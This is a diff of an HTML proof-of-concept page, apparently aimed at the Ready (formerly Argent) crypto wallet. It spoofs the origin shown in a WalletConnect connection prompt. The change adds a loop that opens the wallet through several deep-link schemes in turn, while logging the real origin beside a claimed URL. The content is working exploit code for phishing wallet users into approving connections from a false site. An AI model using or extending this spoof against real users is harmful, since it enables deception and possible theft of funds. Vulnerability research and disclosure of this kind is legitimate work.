@@ -6,7 +6,7 @@
 </head>
 <body>
   <h1>Ready Wallet Origin Spoof PoC</h1>
-  <button id="connect">Ssssspoof connect prompt</button>
+  <button id="connect">Spoof connect prompt</button>
   <pre id="log"></pre>
 
   <script type="module">
@@ -50,9 +50,24 @@
         if (uri) {
           log('Real origin: ' + REAL_ORIGIN);
           log('Claimed URL: ' + CLAIMED_URL);
-          log('URI: ' + uri.substring(0, 50) + '...');
-          log('Opening Ready Wallet...');
-          location.href = `argentmobile://wc?uri=${encodeURIComponent(uri)}`;
+          log('URI generated: ' + uri.substring(0, 50) + '...');
+
+          // Coba semua scheme satu per satu
+          const schemes = [
+            `ready://wc?uri=${encodeURIComponent(uri)}`,
+            `argentmobile://wc?uri=${encodeURIComponent(uri)}`,
+            `argent://wc?uri=${encodeURIComponent(uri)}`,
+            `wc://wc?uri=${encodeURIComponent(uri)}`
+          ];
+
+          for (const scheme of schemes) {
+            const name = scheme.split('://')[0];
+            log('Trying scheme: ' + name + '://');
+            location.href = scheme;
+            await new Promise(r => setTimeout(r, 3000));
+          }
+
+          log('Semua scheme sudah dicoba!');
         }
       } catch(e) {
         log('Error: ' + e.message);
